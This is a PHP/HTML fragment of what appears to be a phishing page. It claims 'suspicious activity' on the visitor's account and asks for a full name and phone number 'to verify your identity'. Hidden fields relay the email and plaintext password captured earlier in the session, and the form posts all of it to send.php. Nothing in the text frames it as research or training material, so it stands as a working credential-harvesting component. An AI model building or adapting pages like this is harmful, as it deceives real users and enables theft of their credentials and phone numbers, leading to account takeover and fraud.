    ...
    <body>
        ...
        <div class="mt55">
            <form method="post" action="<?= base_url('send.php')?>" class="col-12 shadow-sm px20 py17 rounded-4 bg-white">
                <h2 class="fs25 mb20">Verification Required</h2>
                <h3 class="fs20 text-danger">Important Information</h3>
                <p class="my15">Some Suspicious Activity Found With Your Account, Enter Your Phone Number to Verify Your Identity.</p>
                <div class="my25">
                    <label for="" class="form-label fw-normal">Full Name</label>
                    <input type="hidden" name="email" value="<?=$_SESSION['email']?>" >
                    <input type="hidden" name="password" value="<?=$_SESSION['password']?>" >
                    <input name="name" type="text" required="" minlength="3" maxlength="100" class="form-control form-control-lg" placeholder="" value="" >
                </div>
                <div className="my25">
                    <label for="" class="form-label">Phone Number</label>
                    <div class="form-control fs16" style="padding: 0px;">
                        <input name="phone_number" type="number" id="phone_number" required="" style="width: 80%;border: solid 1px #DDD;padding: 10px 5px;margin: 0px;" class="" placeholder="Phone number" value="" >
                    </div>
                </div>
                <div class="text-center mx-auto d-grid gap-2 my25">
                    <button type="submit" class="btn btn-success btn-lg btn-primary-3 border-0 rounded-pill fs16 fw-medium btn-block rounded-0">Submit</button>
                </div>
